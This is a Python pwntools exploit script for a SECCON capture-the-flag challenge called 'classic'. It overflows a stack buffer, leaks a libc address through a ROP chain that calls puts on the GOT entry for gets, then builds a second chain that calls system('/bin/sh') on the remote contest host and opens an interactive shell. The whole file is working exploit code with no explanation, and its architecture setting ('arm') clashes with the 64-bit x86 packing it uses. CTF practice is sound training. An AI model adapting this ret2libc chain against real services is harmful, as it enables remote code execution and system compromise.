# -*- coding: utf-8 -*-

from pwn import *

context(arch='arm', os='linux')
main = ELF('./classic_aa9e979fd5c597526ef30c003bffee474b314e22')
libc = ELF('./libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253')

addr_main = 0x4006a9
plt_printf = 0x400540
plt_puts = 0x400520
got_printf = 0x601028 #objdump -d -j .plt <filename>
got_gets = 0x601038
offset_libc_printf = 0x55800 #libc.symbols['printf']
offset_libc_gets = libc.symbols['gets']

# rop gadgets
pop_rdi = 0x400753

print "got_printf  : {}".format(hex(got_printf))
print 'offset_libc_printf : {}'.format(hex(offset_libc_printf))

#con = remote('localhost', 17354)
con = remote('classic.pwn.seccon.jp', 17354)

print con.recvuntil('Local Buffer >> ')
buf = 'A' * 72 # padding
buf += p64(pop_rdi)
buf += p64(got_gets)
buf += p64(plt_puts)
buf += p64(addr_main)

con.sendline(buf)
print con.recvuntil('pwn!!\n')
libc_gets = u64(con.recv(6) + '\x00\x00')
libc.symbols['gets'] = libc_gets
libc_base = libc_gets - offset_libc_gets
offset_libc_system = libc.symbols['system']
libc_system = libc_base + offset_libc_system
bin_sh = next(libc.search('/bin/sh')) + libc_base

print "libc_gets   : {}".format(hex(libc_gets))
print "libc_system : {}".format(hex(libc_system))
print "/bin/sh     : {}".format(hex(bin_sh))
print p64(libc_gets)

print con.recvuntil('Local Buffer >> ')
buf = 'A' * 72
buf += p64(pop_rdi)
buf += p64(bin_sh)
buf += p64(libc_system)
con.sendline(buf)
print con.recv(1024)

con.interactive()
